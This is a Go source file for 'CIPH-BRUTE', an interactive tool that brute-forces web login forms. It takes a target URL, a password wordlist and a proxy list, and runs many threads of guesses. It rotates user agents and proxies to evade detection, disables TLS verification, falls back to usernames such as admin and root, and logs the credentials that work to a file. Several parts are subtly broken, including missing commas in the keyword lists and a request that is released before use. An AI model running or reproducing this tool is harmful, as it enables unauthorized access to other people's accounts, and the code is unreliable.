package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
	"github.com/willf/bloom"
)

type ProxyConfig struct {
	Type     string
	Host     string
	Port     int
	Username string
	Password string
}

type BruteConfig struct {
	TargetURL      string
	UsernameField  string
	PasswordField  string
	WordlistPath   string
	Threads        int
	Timeout        time.Duration
	Proxies        []ProxyConfig
	UseBloomFilter bool
}

type Attempt struct {
	Username string
	Password string
	Success  bool
	Response string
	Time     time.Duration
}

type CiphBrute struct {
	config    BruteConfig
	client    *fasthttp.Client
	bloom     *bloom.BloomFilter
	results   chan Attempt
	proxyPool chan ProxyConfig
	wg        sync.WaitGroup
}

func NewCiphBrute(config BruteConfig) *CiphBrute {
	cb := &CiphBrute{
		config:  config,
		results: make(chan Attempt, 100),
	}

	
	cb.client = &fasthttp.Client{
		MaxConnsPerHost:           1000,
		MaxIdleConnDuration:        10 * time.Second,
		MaxConnWaitTimeout:         30 * time.Second,
		ReadTimeout:                config.Timeout,
		WriteTimeout:               config.Timeout,
		MaxResponseBodySize:        10 * 1024 * 1024, 
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:     true,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
			Renegotiation:      tls.RenegotiateOnceAsClient,
		},
	}

	
	if config.UseBloomFilter {
		cb.bloom = bloom.New(1000000, 0.001) 
	}

	
	if len(config.Proxies) > 0 {
		cb.proxyPool = make(chan ProxyConfig, len(config.Proxies))
		for _, proxy := range config.Proxies {
			cb.proxyPool <- proxy
		}
	}

	return cb
}

func (cb *CiphBrute) getRandomProxy() ProxyConfig {
	if len(cb.proxyPool) == 0 {
		return ProxyConfig{}
	}

	proxy := <-cb.proxyPool
	cb.proxyPool <- proxy 
	return proxy
}

func (cb *CiphBrute) createRequest(username, password string) (*fasthttp.Request, error) {
	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	req.SetRequestURI(cb.config.TargetURL)
	req.Header.SetMethod("POST")

	
	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	
	formData := fmt.Sprintf("%s=%s&%s=%s",
		url.QueryEscape(cb.config.UsernameField),
		url.QueryEscape(username),
		url.QueryEscape(cb.config.PasswordField),
		url.QueryEscape(password))
	req.SetBody([]byte(formData))
	req.Header.SetContentType("application/x-www-form-urlencoded")

	
	cloneReq := fasthttp.AcquireRequest()
	req.CopyTo(cloneReq)
	return cloneReq, nil
}

func (cb *CiphBrute) attemptLogin(ctx context.Context, username, password string, proxy ProxyConfig) Attempt {
	start := time.Now()
	attempt := Attempt{
		Username: username,
		Password: password,
		Success:  false,
	}

	req, err := cb.createRequest(username, password)
	if err != nil {
		attempt.Response = fmt.Sprintf("Request creation failed: %v", err)
		return attempt
	}
	defer fasthttp.ReleaseRequest(req)

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	
	var client *fasthttp.Client
	if proxy.Host != "" {
		client = cb.createProxyClient(proxy)
	} else {
		client = cb.client
	}

	err = client.DoTimeout(req, resp, cb.config.Timeout)
	if err != nil {
		attempt.Response = fmt.Sprintf("Request failed: %v", err)
		return attempt
	}

	attempt.Time = time.Since(start)
	attempt.Response = string(resp.Body())

	
	success := cb.checkLoginSuccess(resp.StatusCode(), attempt.Response)
	attempt.Success = success

	return attempt
}

func (cb *CiphBrute) createProxyClient(proxy ProxyConfig) *fasthttp.Client {
	proxyURL := ""
	if proxy.Type == "http" || proxy.Type == "https" {
		if proxy.Username != "" && proxy.Password != "" {
			proxyURL = fmt.Sprintf("http://%s:%s@%s:%d", proxy.Username, proxy.Password, proxy.Host, proxy.Port)
		} else {
			proxyURL = fmt.Sprintf("http://%s:%d", proxy.Host, proxy.Port)
		}
	}

	client := &fasthttp.Client{
		MaxConnsPerHost:           1000,
		MaxIdleConnDuration:        10 * time.Second,
		MaxConnWaitTimeout:         30 * time.Second,
		ReadTimeout:                cb.config.Timeout,
		WriteTimeout:               cb.config.Timeout,
		MaxResponseBodySize:        10 * 1024 * 1024,
		DisableHeaderNamesNormalizing: true,
		DisablePathNormalizing:     true,
		TLSConfig: &tls.Config{
			InsecureSkipVerify: true,
			Renegotiation:      tls.RenegotiateOnceAsClient,
		},
	}

	if proxyURL != "" {
		client.Dial = func(addr string) (net.Conn, error) {
			return fasthttp.Dial(proxyURL)
		}
	}

	return client
}

func (cb *CiphBrute) checkLoginSuccess(statusCode int, body string) bool {
	if statusCode == 200 || statusCode == 302 || statusCode == 303 {
		failureIndicators := []string{
			"invalid", "incorrect", "failed", "error", "denied",
			"wrong", "unauthorized", "forbidden", "login failed",
			"authentication failed", "invalid credentials"
		}

		bodyLower := strings.ToLower(body)
		for _, indicator := range failureIndicators {
			if strings.Contains(bodyLower, indicator) {
				return false
			}
		}

		successIndicators := []string{
			"welcome", "dashboard", "logout", "profile", "settings",
			"admin", "success", "authenticated", "logged in"
		}

		for _, indicator := range successIndicators {
			if strings.Contains(bodyLower, indicator) {
				return true
			}
		}

		if statusCode == 302 || statusCode == 303 {
			return true
		}
	}

	return false
}

func (cb *CiphBrute) worker(ctx context.Context, wordlistChan chan string, usernames []string) {
	defer cb.wg.Done()

	for {
		select {
		case <-ctx.Done():
			return
		case password, ok := <-wordlistChan:
			if !ok {
				return
			}

			if cb.bloom != nil {
				for _, username := range usernames {
					credential := fmt.Sprintf("%s:%s", username, password)
					if cb.bloom.TestString(credential) {
						continue
					}
					cb.bloom.AddString(credential)

					proxy := cb.getRandomProxy()
					attempt := cb.attemptLogin(ctx, username, password, proxy)
					cb.results <- attempt

					if attempt.Success {
						fmt.Printf("\n[SUCCESS] %s:%s (%.2fs)\n", username, password, attempt.Time.Seconds())
					}
				}
			}
		}
	}
}

func (cb *CiphBrute) loadWordlist() ([]string, error) {
	file, err := os.Open(cb.config.WordlistPath)
	if err != nil {
		return nil, fmt.Errorf("failed to open wordlist: %v", err)
	}
	defer file.Close()

	var wordlist []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		word := strings.TrimSpace(scanner.Text())
		if word != "" {
			wordlist = append(wordlist, word)
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading wordlist: %v", err)
	}

	return wordlist, nil
}

func (cb *CiphBrute) run() error {
	fmt.Printf("\n[*] CIPH-BRUTE - The Speed Demon")
	fmt.Printf("\n[*] Target: %s", cb.config.TargetURL)
	fmt.Printf("\n[*] Threads: %d", cb.config.Threads)
	fmt.Printf("\n[*] Proxies: %d", len(cb.config.Proxies))
	fmt.Printf("\n[*] Bloom Filter: %t", cb.config.UseBloomFilter)

	wordlist, err := cb.loadWordlist()
	if err != nil {
		return err
	}

	fmt.Printf("\n[*] Loaded %d passwords", len(wordlist))

	var usernames []string
	fmt.Print("\n[?] Enter usernames (comma-separated): ")
	input, _ := readLine()
	for _, username := range strings.Split(input, ",") {
		username = strings.TrimSpace(username)
		if username != "" {
			usernames = append(usernames, username)
		}
	}

	if len(usernames) == 0 {
		usernames = []string{"admin", "root", "user"} 
	}

	fmt.Printf("\n[*] Testing usernames: %v", usernames)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	wordlistChan := make(chan string, cb.config.Threads*2)

	for i := 0; i < cb.config.Threads; i++ {
		cb.wg.Add(1)
		go cb.worker(ctx, wordlistChan, usernames)
	}

	var successCount int
	go func() {
		for attempt := range cb.results {
			if attempt.Success {
				successCount++
				cb.saveSuccess(attempt)
			}
		}
	}()

	fmt.Printf("\n[*] Starting brute force attack...")
	startTime := time.Now()
	attemptCount := 0

	for _, password := range wordlist {
		select {
		case <-ctx.Done():
			break
		case wordlistChan <- password:
			attemptCount += len(usernames)
			if attemptCount%100 == 0 {
				elapsed := time.Since(startTime)
				rate := float64(attemptCount) / elapsed.Seconds()
				fmt.Printf("\r[*] Attempts: %d | Rate: %.0f/sec | Time: %v", attemptCount, rate, elapsed.Round(time.Second))
			}
		}
	}

	close(wordlistChan)
	cb.wg.Wait()
	close(cb.results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n\n[✓] Brute force completed")
	fmt.Printf("\n[*] Total attempts: %d", attemptCount)
	fmt.Printf("\n[*] Successful logins: %d", successCount)
	fmt.Printf("\n[*] Total time: %v", elapsed.Round(time.Second))
	fmt.Printf("\n[*] Average rate: %.0f attempts/sec", float64(attemptCount)/elapsed.Seconds())

	return nil
}

func (cb *CiphBrute) saveSuccess(attempt Attempt) {
	timestamp := time.Now().Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("brute_success_%s.txt", timestamp)

	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	line := fmt.Sprintf("[%s] %s:%s - %s\n", timestamp, attempt.Username, attempt.Password, attempt.Time.String())
	file.WriteString(line)
}

func getRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
	}

	return userAgents[time.Now().UnixNano()%int64(len(userAgents))]
}

func readLine() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	return reader.ReadString('\n')
}

func loadProxies(filename string) ([]ProxyConfig, error) {
	var proxies []ProxyConfig

	file, err := os.Open(filename)
	if err != nil {
		return proxies, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		
		re := regexp.MustCompile(`^(?:(.+):(.+)@)?(.+):(\d+)$`)
		matches := re.FindStringSubmatch(line)
		if matches != nil {
			proxy := ProxyConfig{
				Type: "http",
				Host: matches[3],
			}

			if matches[1] != "" && matches[2] != "" {
				proxy.Username = matches[1]
				proxy.Password = matches[2]
			}

			fmt.Sscanf(matches[4], "%d", &proxy.Port)
			proxies = append(proxies, proxy)
		}
	}

	return proxies, scanner.Err()
}

func main() {
	fmt.Println("\n" + strings.Repeat("=", 60))
	fmt.Println("CIPH-BRUTE - The Speed Demon")
	fmt.Println(strings.Repeat("=", 60))

	var config BruteConfig


	fmt.Print("[?] Target URL (e.g., http://example.com/login): ")
	targetURL, _ := readLine()
	config.TargetURL = strings.TrimSpace(targetURL)

	fmt.Print("[?] Username field name (default: username): ")
	usernameField, _ := readLine()
	config.UsernameField = strings.TrimSpace(usernameField)
	if config.UsernameField == "" {
		config.UsernameField = "username"
	}

	fmt.Print("[?] Password field name (default: password): ")
	passwordField, _ := readLine()
	config.PasswordField = strings.TrimSpace(passwordField)
	if config.PasswordField == "" {
		config.PasswordField = "password"
	}

	fmt.Print("[?] Wordlist path (default: wordlist.txt): ")
	wordlistPath, _ := readLine()
	config.WordlistPath = strings.TrimSpace(wordlistPath)
	if config.WordlistPath == "" {
		config.WordlistPath = "wordlist.txt"
	}

	fmt.Print("[?] Thread count (default: 50): ")
	threadsStr, _ := readLine()
	threadsStr = strings.TrimSpace(threadsStr)
	if threadsStr == "" {
		config.Threads = 50
	} else {
		fmt.Sscanf(threadsStr, "%d", &config.Threads)
	}

	fmt.Print("[?] Request timeout in seconds (default: 10): ")
	timeoutStr, _ := readLine()
	timeoutStr = strings.TrimSpace(timeoutStr)
	if timeoutStr == "" {
		config.Timeout = 10 * time.Second
	} else {
		var timeoutSec int
		fmt.Sscanf(timeoutStr, "%d", &timeoutSec)
		config.Timeout = time.Duration(timeoutSec) * time.Second
	}

	fmt.Print("[?] Use proxies? (y/n, default: n): ")
	useProxies, _ := readLine()
	useProxies = strings.TrimSpace(strings.ToLower(useProxies))

	if useProxies == "y" {
		fmt.Print("[?] Proxy list file (default: proxies.txt): ")
		proxyFile, _ := readLine()
		proxyFile = strings.TrimSpace(proxyFile)
		if proxyFile == "" {
			proxyFile = "proxies.txt"
		}

		proxies, err := loadProxies(proxyFile)
		if err != nil {
			fmt.Printf("[!] Failed to load proxies: %v\n", err)
		} else {
			config.Proxies = proxies
			fmt.Printf("[*] Loaded %d proxies\n", len(config.Proxies))
		}
	}

	config.UseBloomFilter = true

	brute := NewCiphBrute(config)
	if err := brute.run(); err != nil {
		fmt.Printf("[!] Error: %v\n", err)
	}

	fmt.Print("\n[!] Press Enter to continue...")
	readLine()
}
